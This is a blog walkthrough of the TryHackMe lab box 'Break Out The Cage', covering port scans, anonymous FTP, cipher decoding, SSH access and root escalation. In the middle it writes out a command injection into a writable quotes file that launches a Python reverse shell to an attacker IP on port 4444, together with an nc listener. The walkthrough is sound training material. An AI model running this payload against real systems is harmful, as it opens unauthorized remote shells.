<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Break Out the Cage is another recently released easy box on TryHackme. Let&rsquo;s start off with a port scan with nmap -p- -T4 [machine ip] This will return 3 open ports: ftp, ssh, and http.
Let&rsquo;s enumerate these 3 ports with nmap -sC -sV -O -p 21,22,80 [machine ip].
It appears that there is anonymous FTP access open, let&rsquo;s login as anonymous with ftp [machine ip] and enter anonymous for the username and password."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Break Out The Cage - TryHackMe"><meta name=twitter:description content="Break Out the Cage is another recently released easy box on TryHackme. Let&rsquo;s start off with a port scan with nmap -p- -T4 [machine ip] This will return 3 open ports: ftp, ssh, and http.
Let&rsquo;s enumerate these 3 ports with nmap -sC -sV -O -p 21,22,80 [machine ip].
It appears that there is anonymous FTP access open, let&rsquo;s login as anonymous with ftp [machine ip] and enter anonymous for the username and password."><meta property="og:title" content="Break Out The Cage - TryHackMe"><meta property="og:description" content="Break Out the Cage is another recently released easy box on TryHackme. Let&rsquo;s start off with a port scan with nmap -p- -T4 [machine ip] This will return 3 open ports: ftp, ssh, and http.
Let&rsquo;s enumerate these 3 ports with nmap -sC -sV -O -p 21,22,80 [machine ip].
It appears that there is anonymous FTP access open, let&rsquo;s login as anonymous with ftp [machine ip] and enter anonymous for the username and password."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-07-11-break-out-the-cage-walkthrough/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-07-11T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-11T00:00:00+00:00"><title>Break Out The Cage - TryHackMe · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-07-11-break-out-the-cage-walkthrough/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.3be366585a98f2fd37ebeea71b40bbe125880d4f9ab6d54e7c383ff0e1d19d66.css integrity="sha256-O+NmWFqY8v036+6nG0C74SWIDU+attVOfDg/8OHRnWY=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.815859ce402d78e4e2074b80305c3b86578d026ab3055642afc27e110e03fac2.css integrity="sha256-gVhZzkAteOTiB0uAMFw7hleNAmqzBVZCr8J+EQ4D+sI=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-07-11-break-out-the-cage-walkthrough/>Break Out The Cage - TryHackMe</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-07-11T00:00:00Z>July 11, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
5-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/break-out-the-cage/>Break Out The Cage</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/encryption/>encryption</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/email/>email</a></span></div></div></header><div><p>Break Out the Cage is another recently released easy box on <a href=https://www.tryhackme.com>TryHackme</a>. Let&rsquo;s start off with a port scan with <strong>nmap -p- -T4 [machine ip]</strong> This will return 3 open ports: ftp, ssh, and http.</p><p><img src=/assets/img/BreakOutTheCage1.png alt="Break Out The Cage nmap1"></p><p>Let&rsquo;s enumerate these 3 ports with <strong>nmap -sC -sV -O -p 21,22,80 [machine ip]</strong>.</p><p><img src=/assets/img/BreakOutTheCage2.png alt="Break Out The Cage nmap2"></p><p>It appears that there is anonymous FTP access open, let&rsquo;s login as anonymous with <strong>ftp [machine ip]</strong> and enter <strong>anonymous</strong> for the username and password. We are able to successfully connect. I tried to list the directory and received an error so I change the mode to passive with <strong>passive</strong> and I was able to run <strong>ls</strong>. There was a file named <strong>dad_tasks</strong>, that I saved locally to my machine with <strong>get dad_tasks</strong>. I then exited the FTP site with <strong>bye</strong>.</p><p><img src=/assets/img/BreakOutTheCage3.png alt="Break Out The Cage ftp dad_tasks"></p><p>Running <strong>cat dad_tasks</strong> from my local machine gives me results that are encoded, most likely in base 64.</p><p><img src=/assets/img/BreakOutTheCage4.png alt="Break Out The Cage cat dad_tasks"></p><p>Let&rsquo;s run <strong>cat dad_tasks | base64 -d</strong> to decode it from base64. This gives us a different type of encoding.</p><p><img src=/assets/img/BreakOutTheCage5.png alt="Break Out The Cage base64 decode"></p><p>This appears to be some sort of cipher. I tried several, and ended up finding out it is a Vigenere cipher. Since I didn&rsquo;t have the key, I used a <a href=https://www.guballa.de/vigenere-solver>Vigenere solver</a> to assist with cracking this, which results in the following.</p><p><img src=/assets/img/BreakOutTheCage6.png alt="Break Out The Cage Vigenere Cipher"></p><p>The last line contains what appears to be Weston&rsquo;s password, which is the answer to question one.</p><p>Now that we have a password, let&rsquo;s try to ssh in as weston with <strong>ssh weston@[machine ip]</strong>. Enter the password that was recovered above. Success, now we are logged in as weston.</p><p><img src=/assets/img/BreakOutTheCage7.png alt="Break Out The Cage ssh user access"></p><p>Let&rsquo;s see what weston can run as root with <strong>sudo -l</strong>. We are given the following results:</p><p><img src=/assets/img/BreakOutTheCage8.png alt="Break Out The Cage sudo -l"></p><p>Let&rsquo;s run that file and see what happens. It prints some text. Running <strong>cat /usr/bin/bees</strong> shows you that this is a bash script.</p><p><img src=/assets/img/BreakOutTheCage25.png alt="Break Out The Cage bees"></p><p>Unfortunately, we are not able to edit this file. However, every few minutes a broadcast message from cage comes up.</p><p><img src=/assets/img/BreakOutTheCage9.png alt="Break Out The Cage broadcast"></p><p>We are not able to access cage&rsquo;s home directory as weston. However, if we run <strong>id</strong>, we can see that weston is part of both the weston and cage groups</p><p><img src=/assets/img/BreakOutTheCage10.png alt="Break Out The Cage id"></p><p>Let&rsquo;s use <strong>find / -group &ldquo;cage&rdquo; -print 2>/dev/null</strong> to find all files with the group owner of cage.</p><p><img src=/assets/img/BreakOutTheCage12.png alt="Break Out The Cage find"></p><p>We already know we don&rsquo;t have access to /home/cage, but let&rsquo;s try to navigate to /opt/.dads_scripts/ with <strong>cd /opt/.dads_scripts</strong> and view directory contents and permissions with <strong>ls -al</strong>.</p><p><img src=/assets/img/BreakOutTheCage13.png alt="Break Out The Cage dads_scripts"></p><p>It appears we only have read to the python script, so we can&rsquo;t modify it directly. Let&rsquo;s view the contents of the script to see what it does with <strong>cat spread_the_quotes.py</strong>.</p><p><img src=/assets/img/BreakOutTheCage14.png alt="Break Out The Cage spread_the_quotes.py"></p><p>It looks like it is opening a file in /opt/.dads_scripts/.files/.quotes and reading a random line and then echoing it. Let&rsquo;s navigate to that directory with <strong>cd /opt/.dads_scripts/.files/</strong>. Next let&rsquo;s run <strong>ls -al</strong>. It appears we have access to write to the <strong>.quotes</strong> file as the cage group has write permissions to it.</p><p><img src=/assets/img/BreakOutTheCage15.png alt="Break Out The Cage .files"></p><p>Let&rsquo;s run <strong>vi .quotes</strong> to open up the contents for editing and delete everything out of the file. This can be done by pressing <strong>dd</strong> over and over until all the lines are deleted. Next, press Insert and <strong>&ndash; INSERT &ndash;</strong> should show up at the bottom of the screen. This allows you to enter in new information. Let&rsquo;s enter the following: <strong>&ldquo;test&rdquo; && python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[attacker ip]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")&rsquo;</strong>. This will end the wall command&rsquo;s input which will send out test as a broadcast, and then && will run the command after, which is a way to create a reverse shell with python. We know this shell will work due to the fact that python scripts are running on this machine already. Next, press escape followed by <strong>:wq!</strong> to write and quit vim.</p><p><img src=/assets/img/BreakOutTheCage16.png alt="Break Out The Cage .quotes"></p><p>In another terminal window, run <strong>nc -nvlp 4444</strong> and wait a few minutes for the script to run. You should receive a reverse shell connection as cage. Running <strong>whoami</strong> confirms this and running <strong>ls -al</strong> shows an <strong>email_backup</strong> directory and a file called <strong>Super_Duper_Checklist</strong>. Let&rsquo;s view the contents of the Checklist first with <strong>cat Super_Duper_Checklist</strong>.</p><p><img src=/assets/img/BreakOutTheCage18.png alt="Break Out the Cage cat Super_Duper_Checklist"></p><p>This is the user flag for this box. Let&rsquo;s now see if cage has any sudo level permissions. Let&rsquo;s run <strong>sudo -l</strong>. Unfortunately, it asks for cage&rsquo;s password which we do not have. Let&rsquo;s go review the email_backup folder by typing in <strong>cd email_backup</strong>. Running <strong>ls -al</strong> shows 3 files here. Using <strong>cat em</strong>* will type the contents of all 3 emails.</p><p><img src=/assets/img/BreakOutTheCage19.png alt="Break Out The Cage email_backup"></p><p>The emails mention a Face Off sequel and have several references to the word face in them. The last email has something interesting in it based on a weird note from the agent.</p><p><img src=/assets/img/BreakOutTheCage20.png alt="Break Out The Cage email_3"></p><p>This appears to be another encrypted message. Let&rsquo;s see if this is also a Vigenere cipher. The word face is mentioned over and over and over in these emails, so let&rsquo;s see if that&rsquo;s the key to the cipher. Since we are assuming this is the correct key, let&rsquo;s use this <a href=https://www.boxentriq.com/code-breaking/vigenere-cipher>Vigenere Cipher Decoder</a> to decode the cipher.</p><p><img src=/assets/img/BreakOutTheCage21.png alt="Break Out The Cage Vignere Cipher Decoder"></p><p>In the 3rd email, it states that it likely has something to do with his account on this server. Since there are no other users, it&rsquo;s safe to assume that this could potentially be the password for root. Let&rsquo;s run <strong>su root</strong> and enter the password we obtained above.</p><p><img src=/assets/img/BreakOutTheCage22.png alt="Break Out The Cage su root"></p><p>Success! We now have root access. Let&rsquo;s see if we can find the root flag now. Let&rsquo;s navigate to root&rsquo;s home folder with <strong>cd /root</strong> and run <strong>ls -al</strong>. We will see an email_backup folder. Let&rsquo;s navigate to it with <strong>cd email_backup</strong> and run **ls **, we see two emails in this folder.</p><p><img src=/assets/img/BreakOutTheCage23.png alt="Break Out The Cage finding root flag"></p><p>Let&rsquo;s run <strong>cat em</strong>* to view their contents. In the bottom of the second email is the root flag.</p><p><img src=/assets/img/BreakOutTheCage24.png alt="Break Out The Cage Root Flag"></p><p>This is the root flag for this challenge!</p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>